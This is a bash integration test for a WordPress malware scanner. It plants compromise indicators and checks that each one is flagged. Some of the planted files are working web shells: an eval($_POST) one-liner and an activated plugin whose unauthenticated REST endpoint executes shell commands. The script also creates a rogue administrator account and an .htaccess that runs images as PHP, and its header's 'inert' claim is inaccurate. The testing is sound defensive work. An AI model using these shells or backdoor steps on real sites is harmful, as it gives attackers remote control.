#!/usr/bin/env bash
#
# Integration tests against a real WordPress install.
#
#   tests/integration.sh /path/to/wordpress
#
# The site must already be installed with this plugin active, and `wp` (WP-CLI)
# must be on PATH (or set WP="php /path/wp-cli.phar"). The script plants inert
# text files that mimic wp2shell indicators, so only run it on a throwaway site.
#
set -uo pipefail

SITE="${1:?usage: integration.sh /path/to/wordpress}"
WP="${WP:-wp} --path=$SITE --allow-root --skip-themes"
C="$SITE/wp-content"
FAIL=0
PASS=0

ok()   { PASS=$((PASS+1)); echo "  ✓ $1"; }
bad()  { FAIL=$((FAIL+1)); echo "  ✗ $1"; }
scan() { $WP wp2shell scan --skip-core --format=json --min=info 2>/dev/null; }

has() { # has <json> <jq filter> <label>
	if echo "$1" | jq -e "$2" >/dev/null 2>&1; then ok "$3"; else bad "$3"; fi
}
hasnt() {
	if echo "$1" | jq -e "$2" >/dev/null 2>&1; then bad "$3"; else ok "$3"; fi
}
msg() { echo "[.findings[] | select(.message | test(\"$1\"; \"i\"))] | length > 0"; }

echo "== 1. Clean site =="
R=$(scan)
has   "$R" '.verdict' "scan returns a verdict"
if echo "$R" | jq -e '[.findings[] | select(.type=="version" and .severity!="info")] | length > 0' >/dev/null; then
	has "$R" '.verdict == "VULNERABLE"' "unpatched clean site is VULNERABLE (not COMPROMISED)"
	$WP wp2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
	[ "$CODE" = "1" ] && ok "exit code 1 when vulnerable" || bad "exit code was $CODE, expected 1"
else
	has "$R" '.verdict == "CLEAN" or .verdict == "REVIEW"' "patched clean site is CLEAN/REVIEW"
fi
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and .type!="version")] | length > 0' "no high/critical findings on a clean install"
hasnt "$R" "$(msg 'wp2shell Scanner')" "scanner doesn't flag itself"

echo "== 2. False-positive bait =="
mkdir -p "$C/uploads/2026/08" "$C/cache/wp-rocket/example.com"
printf '<?php\n// Silence is golden.\n' > "$C/uploads/index.php"
printf '<?php /* nothing here */ ?>\n' > "$C/uploads/2026/08/index.php"
printf '<?php $cache = array(); return $cache;\n' > "$C/cache/wp-rocket/example.com/index-https.php"
R=$(scan)
hasnt "$R" "$(msg 'uploads/index.php')" "'Silence is golden' index.php in uploads is not flagged"
hasnt "$R" "$(msg 'wp-rocket')" "cache-plugin PHP is not flagged"

echo "== 3. Planted indicators =="
mkdir -p "$C/plugins/wp2shell_6a5566a6" "$C/plugins/gg-helper" "$C/upgrade/wp2shell_79b06a80" "$C/plugins/cmsmap" "$C/uploads/2026/07"
printf '<?php\n/* Plugin Name: wp2shell_6a5566a6 */\n' > "$C/plugins/wp2shell_6a5566a6/wp2shell_6a5566a6.php"
printf '<?php\n/* Plugin Name: CMSmap */\n' > "$C/plugins/cmsmap/cmsmap.php"
printf "<?php\neval(\$_POST['k']??'http_response_code(404);');\n" > "$C/cache/x.php"
printf "<?php\n/* Plugin Name: gg-helper */\nadd_action('rest_api_init',function(){register_rest_route('morning/v1','/z',array('methods'=>'POST','permission_callback'=>'__return_true','callback'=>function(\$r){ob_start();passthru(base64_decode(\$r->get_param('c')).' 2>&1');return ob_get_clean();}));});\n" > "$C/plugins/gg-helper/gg-helper.php"
printf "<?php eval(gzuncompress(base64_decode('AAAA')));\n" > "$C/uploads/2026/07/img.php"
printf 'AddHandler application/x-httpd-php .jpg\n' > "$C/uploads/.htaccess"
printf '<?php echo 1;\n' > "$C/themes/.hidden.php"
touch "$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
$WP plugin activate gg-helper --quiet
$WP user create backdoor bd@evil.test --role=administrator --quiet >/dev/null 2>&1
$WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>gmdate("Y-m-d H:i:s", time()+7200)), array("user_login"=>"backdoor"));'

LOG=$(mktemp)
cat > "$LOG" <<'EOF'
1.2.3.4 - - [18/Jul/2026:10:00:00 +0000] "POST /?rest_route=/batch/v1 HTTP/1.1" 207 512 "-" "wp2shell"
34.81.132.62 - - [18/Jul/2026:10:00:05 +0000] "GET /wp-json/wp/v2/users?context=edit HTTP/1.1" 200 10 "-" "Mozilla/5.0"
34.81.132.62 - - [18/Jul/2026:10:00:09 +0000] "POST /wp-admin/update.php?action=upload-plugin HTTP/1.1" 302 0 "-" "Mozilla/5.0"
EOF

R=$($WP wp2shell scan --skip-core --format=json --min=info --log="$LOG" 2>/dev/null)
has "$R" '.verdict == "COMPROMISED"'           "verdict is COMPROMISED"
has "$R" "$(msg 'wp2shell exploit.s naming')"   "wp2shell_<hex> plugin"
has "$R" "$(msg 'CMSmap')"                      "CMSmap plugin"
has "$R" "$(msg 'hides behind a 404')"          "404 eval one-liner in cache/"
has "$R" "$(msg '(REST endpoint that runs shell|base64-encoded shell).*gg-helper')" "REST command-exec shell"
has "$R" "$(msg 'namespace .morning/v1')"       "morning/v1 namespace registered"
has "$R" "$(msg 'gg-. prefix')"                 "gg- plugin name"
has "$R" "$(msg 'Packed/obfuscated')"           "packed eval in uploads"
has "$R" "$(msg 'PHP file in a data folder: wp-content/uploads/2026/07/img.php')" "PHP in uploads"
has "$R" "$(msg 'htaccess enables PHP')"        ".htaccess PHP handler in uploads"
has "$R" "$(msg 'Hidden PHP file')"             "hidden PHP file"
has "$R" "$(msg 'Write-test file')"             "temp-write-test probe"
has "$R" "$(msg 'plugin archive')"              "wp2shell_*.zip"
has "$R" "$(msg 'staging folder')"              "upgrade/wp2shell_<hex> folder"
has "$R" '[.findings[] | select(.type=="user" and .severity=="high" and (.message|test("backdoor")))] | length > 0' "rogue admin is high"
has "$R" '[.findings[] | select(.type=="user" and (.message|test("set up")))] | length > 0' "original admin recognised as site setup"
has "$R" "$(msg 'successful .200/207. requests to the batch API')" "log: successful batch API hit"
has "$R" "$(msg 'exploit tools')"               "log: tool user-agent"
has "$R" "$(msg 'attacker IPs')"                "log: attacker IP"
has "$R" "$(msg 'plugin-upload')"               "log: plugin upload"
has "$R" "$(msg 'user-enumeration')"            "log: user enumeration"

echo "== 4. Resumable scanning (tiny time slices) =="
FULL=$(echo "$R" | jq '[.findings[] | select(.type!="log")] | length')
SLICED=$($WP eval '
	$s = WP2SS_Scanner::start( array( "core" => false, "log" => "" ), "test", true );
	$steps = 0;
	do { $r = WP2SS_Scanner::step( 0.01 ); $steps++; } while ( is_array( $r ) && empty( $r["verdict"] ) && $steps < 100000 );
	echo $steps, " ", count( $r["findings"] );
' 2>/dev/null)
STEPS=${SLICED%% *}; COUNT=${SLICED##* }
[ "${STEPS:-0}" -gt 1 ] && ok "scan resumed across $STEPS slices" || bad "scan did not split into slices ($SLICED)"
[ "$COUNT" = "$FULL" ] && ok "sliced scan found the same $COUNT findings" || bad "sliced scan found $COUNT, full scan $FULL"

echo "== 5. Ignore list & exit codes =="
$WP wp2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
[ "$CODE" = "2" ] && ok "exit code 2 when compromised" || bad "exit code was $CODE, expected 2"
ID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("Hidden PHP"))][0].id')
$WP wp2shell ignore "$ID" >/dev/null
R2=$(scan)
hasnt "$R2" "[.findings[] | select(.id==\"$ID\")] | length > 0" "ignored finding is hidden"
$WP wp2shell ignore "$ID" --undo >/dev/null
has "$($WP wp2shell status --format=json 2>/dev/null)" '.verdict' "status command works"

echo "== 6. Cleanup → clean again =="
rm -rf "$C/plugins/wp2shell_6a5566a6" "$C/plugins/cmsmap" "$C/upgrade/wp2shell_79b06a80" \
	"$C/cache/x.php" "$C/uploads/2026/07/img.php" "$C/uploads/.htaccess" "$C/themes/.hidden.php" \
	"$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
$WP plugin deactivate gg-helper --quiet; rm -rf "$C/plugins/gg-helper"
$WP user delete backdoor --yes --quiet
R=$(scan)
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and .type!="version")] | length > 0' "no high/critical findings after cleanup"
rm -f "$LOG"

echo
echo "$PASS passed, $FAIL failed"
[ "$FAIL" = 0 ]
